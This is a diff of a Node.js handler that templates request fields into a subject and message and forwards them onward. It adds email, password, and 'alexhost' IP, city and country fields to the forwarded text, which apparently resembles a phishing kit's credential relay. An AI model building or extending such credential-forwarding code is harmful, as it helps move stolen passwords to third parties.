@@ -19,11 +19,13 @@ function loadUrls() {
 // SAVE URLS
 // ======================
 function saveUrls(data) {
-  fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
+  try {
+    fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
+  } catch {}
 }
 
 // ======================
-// BODY PARSER
+// BODY PARSER SAFE
 // ======================
 function parseBody(req) {
   if (!req.body) return {};
@@ -34,12 +36,20 @@ function parseBody(req) {
 }
 
 // ======================
-// TEMPLATE $var
+// AUTO TEMPLATE ENGINE
 // ======================
-function render(str, vars) {
-  return String(str).replace(/\$(\w+)/g, (_, k) =>
-    vars[k] !== undefined ? vars[k] : `$${k}`
-  );
+function renderAdvanced(str, vars) {
+  if (!str) return "";
+
+  return String(str)
+    // $var
+    .replace(/\$(\w+)/g, (_, key) => vars[key] ?? "")
+
+    // ${d.xxx}
+    .replace(/\$\{d\.(\w+)\}/g, (_, key) => vars[key] ?? "")
+
+    // clean unknown ${...}
+    .replace(/\$\{.*?\}/g, "");
 }
 
 // ======================
@@ -126,7 +136,7 @@ module.exports = async (req, res) => {
     }
 
     // ======================
-    // VARIABLES AUTO
+    // AUTO VARIABLES
     // ======================
     const vars = {
       subjek,
@@ -135,34 +145,25 @@ module.exports = async (req, res) => {
         req.headers["x-forwarded-for"] ||
         req.socket?.remoteAddress ||
         "unknown",
-      time: new Date().toISOString()
+      time: new Date().toISOString(),
+
+      // optional custom fields
+      email: body.email || "",
+      alexhost_ip: body.alexhost_ip || "",
+      alexhost_kota: body.alexhost_kota || "",
+      alexhost_negara: body.alexhost_negara || "",
+      password: body.password || ""
     };
 
     // ======================
-    // RENDER MESSAGE
+    // RENDER HTML + TEXT
     // ======================
-    const message = `
-<div style="font-family:Arial;background:#0f172a;color:#fff;padding:20px;border-radius:12px">
-  <h1 style="color:#38bdf8">🚨 SYSTEM ALERT</h1>
-
-  <p><b>Subject:</b> ${render(subjek, vars)}</p>
-  <p><b>User:</b> ${sender}</p>
-  <p><b>IP:</b> ${vars.ip}</p>
-  <p><b>Time:</b> ${vars.time}</p>
-
-  <hr style="border:1px solid #334155">
-
-  <h3 style="color:#22c55e">📊 Message</h3>
-
-  <div style="padding:10px;background:#1e293b;border-radius:8px">
-    ${render(pesan, vars)}
-  </div>
-</div>
-`;
+    const content = renderAdvanced(pesan, vars);
+    const subjectFinal = renderAdvanced(subjek, vars);
 
     const payload = new URLSearchParams({
-      subjek,
-      pesan: message,
+      subjek: subjectFinal,
+      pesan: content,
       sender
     }).toString();
 
